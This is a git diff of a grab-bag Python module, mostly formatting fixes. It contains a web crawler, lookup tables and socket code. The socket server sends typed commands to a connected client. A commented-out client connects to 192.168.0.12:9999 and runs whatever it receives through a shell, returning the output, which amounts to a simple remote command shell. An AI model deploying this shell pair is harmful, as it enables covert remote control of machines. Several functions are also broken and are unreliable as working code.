@@ -33,7 +33,6 @@ RESERVED = ['False', 'None', 'True', 'and', 'as', 'assert', 'break',
             'raise', 'return', 'try', 'while', 'with', 'yield']
 KEYWORDS = keyword.kwlist
 
-
 OSI_Layers = {0: ("Layer", "Type", {"Protocol Data Units"},
                   {"Protocol"}, {""},
                   "", {"", "", ""}),
@@ -81,7 +80,7 @@ OSI_Layers = {0: ("Layer", "Type", {"Protocol Data Units"},
                    "Server Message Block",
                    "Secure Shell",
                    "Remote Desktop Protocol"},
-                  "", {"", "", ""}) }
+                  "", {"", "", ""})}
 
 HTTP_Status = {1: "Information",
                2: "Successful",
@@ -89,32 +88,34 @@ HTTP_Status = {1: "Information",
                4: "Client Error",
                5: "Server Error"}
 
-
-
 import moreadt, fileman
 from html.parser import HTMLParser
-
 
 
 def update_python():
     import pip
     installed_packages = pip.get_installed_distributions()
     installed_packages_list = sorted(["%s==%s" % (i.key, i.version)
-         for i in installed_packages])
+                                      for i in installed_packages])
     for pack in installed_packages_list:
         print(pack)
+
 
 def single_thread(function, arguments):
     return map(function, arguments)
 
+
 def multi_thread(function, arguments):
     return concurrent.futures.ProcessPoolExecutor.map(function, arguments)
+
 
 def intensive(number):
     return number ** 1000
 
+
 def fully_qualified(object):
     return object.__qualname__
+
 
 def create_socket():
     try:
@@ -127,6 +128,7 @@ def create_socket():
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
+
 def bind_socket():
     try:
         global host
@@ -136,14 +138,16 @@ def bind_socket():
         server.bind((host, port))
         server.listen(5)
     except socket.error as msg:
-        print ("Socket binding error: " + str(msg) + "\n" + "Retrying...")
+        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
         socket_bind()
+
 
 def accept_socket():
     conn, address = server.accept()
-    #print("" + "" + "" + )
+    # print("" + "" + "" + )
     send_commands(conn)
     conn.close()
+
 
 def send_commands(conn):
     while True:
@@ -155,16 +159,16 @@ def send_commands(conn):
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end = "")
+            print(client_response, end="")
 
 
-            
 def get_domain_name(url):
     try:
         domain = get_sub_domain_name(url).split('.')
         return domain[-2] + '.' + domain[-1]
     except:
         return ''
+
 
 def get_sub_domain_name(url):
     try:
@@ -173,9 +177,7 @@ def get_sub_domain_name(url):
         return ''
 
 
-
 class LinkFinder(HTMLParser):
-
     def __init__(self, base_url, page_url):
         super().__init__()
         self.base_url = base_url
@@ -196,9 +198,7 @@ class LinkFinder(HTMLParser):
         pass
 
 
-
 class Crawler:
-
     target_name = ''
     base_url = ''
     domain_name = ''
@@ -229,9 +229,9 @@ class Crawler:
     @staticmethod
     def crawl_page(thread_name, page_url):
         if page_url not in Crawler.crawled:
-            print (thread_name + ' now crawling ' + page_url)
-            print ('Queue ' + str(len(Crawler.queue)) +
-                   ' | crawled ' + str(len(Crawler.crawled)))
+            print(thread_name + ' now crawling ' + page_url)
+            print('Queue ' + str(len(Crawler.queue)) +
+                  ' | crawled ' + str(len(Crawler.crawled)))
             Crawler.add_links_to_queue(Crawler.gather_links(page_url))
             Crawler.queue.remove(page_url)
             Crawler.crawled.add(page_url)
@@ -274,10 +274,9 @@ def create_tasks(worker, task_queue):
         task_queue.put(link)
     task_queue.join()
     return task_queue
-        
+
 
 def crawl_website(target, website, threads):
-
     def work():
         while True:
             url = task_queue.get()
@@ -293,26 +292,26 @@ def crawl_website(target, website, threads):
         task_queue = create_tasks(worker, task_queue)
 
     for _ in range(threads):
-        workers = threading.Thread(target = work)
+        workers = threading.Thread(target=work)
         workers.daemon = True
         workers.start()
-    
 
 
 def main():
     create_socket()
     bind_socket()
     accept_socket()
-    
-#main()
 
 
-#client = socket.socket()
-#hostname = '192.168.0.12'
-#tcpport = 9999
-#client.connect((hostname, tcpport))
+# main()
 
-#while True:
+
+# client = socket.socket()
+# hostname = '192.168.0.12'
+# tcpport = 9999
+# client.connect((hostname, tcpport))
+
+# while True:
 #    data = client.recv(1024)
 #    if len(data) > 0:
 #        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True,
@@ -321,22 +320,23 @@ def main():
 #        output_str = str(output_bytes, "utf-8")
 #        client.send(str.encode(output_str + str(os.getcwd()) + '> '))
 #        print(output_str)
-                         
 
 
 
 
-            
 
 
 
-    
-    
+
+
+
+
 
 parameters = list(range(20))
 
-#If this module is being run as a stand-alone program
+# If this module is being run as a stand-alone program
 import doctest
+
 if __name__ == '__main__':
     doctest.testmod()
     unittest.main(exit=False)
